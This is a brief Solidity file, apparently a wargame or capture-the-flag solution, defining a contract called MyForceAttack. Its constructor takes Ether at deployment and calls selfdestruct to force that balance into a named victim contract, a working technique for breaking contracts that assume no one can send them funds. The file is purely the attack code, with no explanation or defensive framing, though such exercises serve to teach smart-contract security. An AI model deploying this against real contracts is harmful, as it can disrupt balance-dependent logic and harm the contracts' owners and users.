// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract MyForceAttack {
    constructor(address victimContract) payable {
        selfdestruct(payable(victimContract));
    }
}
